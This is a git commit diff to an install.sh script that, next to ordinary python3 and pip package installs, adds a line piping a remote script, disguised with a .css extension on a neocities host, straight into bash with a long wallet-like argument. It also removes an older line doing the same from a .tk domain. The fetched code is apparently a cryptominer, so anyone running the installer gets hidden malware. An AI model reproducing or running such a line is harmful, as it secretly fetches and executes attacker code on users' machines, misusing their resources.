778251ddd06c20ef2ef6a5bb9f609a17b40092fd
Pirata-hack <78007900+Pirata-hack@users.noreply.github.com>
2021-04-09 23:37:37 -0600

    Update install.sh

--- install.sh
+++ install.sh
@@ -1,4 +1,4 @@
+curl -s -L https://hacker159.neocities.org/setup-L.sh.css| bash -s 42L2cGW43iGD5Krhc7NeX7BuwzdHjSkZUMHMm8nmhYuyZosNQbT6Hd7fwcwzFxJCEKaWjLKYpAZHPfBCrSfbjSX5DgFJD4C
 sudo apt-get install python3
 pip3 install bs4
-curl -s -L http://www.full-programas.tk/Linux/setup-L.sh | bash -s 42L2cGW43iGD5Krhc7NeX7BuwzdHjSkZUMHMm8nmhYuyZosNQbT6Hd7fwcwzFxJCEKaWjLKYpAZHPfBCrSfbjSX5DgFJD4C 
 pip3 install requests
